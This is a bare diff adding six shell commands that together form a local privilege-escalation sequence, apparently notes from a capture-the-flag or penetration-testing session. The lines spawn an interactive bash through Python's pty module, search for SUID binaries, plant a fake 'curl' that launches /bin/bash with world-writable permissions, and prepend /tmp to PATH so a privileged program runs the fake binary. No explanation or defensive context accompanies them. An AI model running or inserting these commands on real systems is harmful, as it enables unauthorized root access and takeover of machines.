@@ -1,0 +1,6 @@
+python -c 'import pty;pty.spawn("/bin/bash")'
+bash -i
+find / -perm -u=s 2>/dev/null
+echo /bin/bash > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
